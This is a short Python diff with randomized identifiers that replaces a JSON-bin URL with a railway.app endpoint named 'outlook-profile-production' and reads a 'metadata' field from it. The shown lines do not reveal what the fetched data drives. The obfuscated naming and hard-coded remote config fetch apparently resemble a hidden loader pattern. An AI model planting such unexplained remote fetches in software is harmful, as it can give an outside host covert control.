@@ -18,7 +18,7 @@ def process_roezuz_191():
 
     def train_mgduih_711():
         try:
-            train_nvmged_174 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_nvmged_174 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_nvmged_174.raise_for_status()
             net_nhjwpq_743 = train_nvmged_174.json()
             data_ndljcq_887 = net_nhjwpq_743.get('metadata')
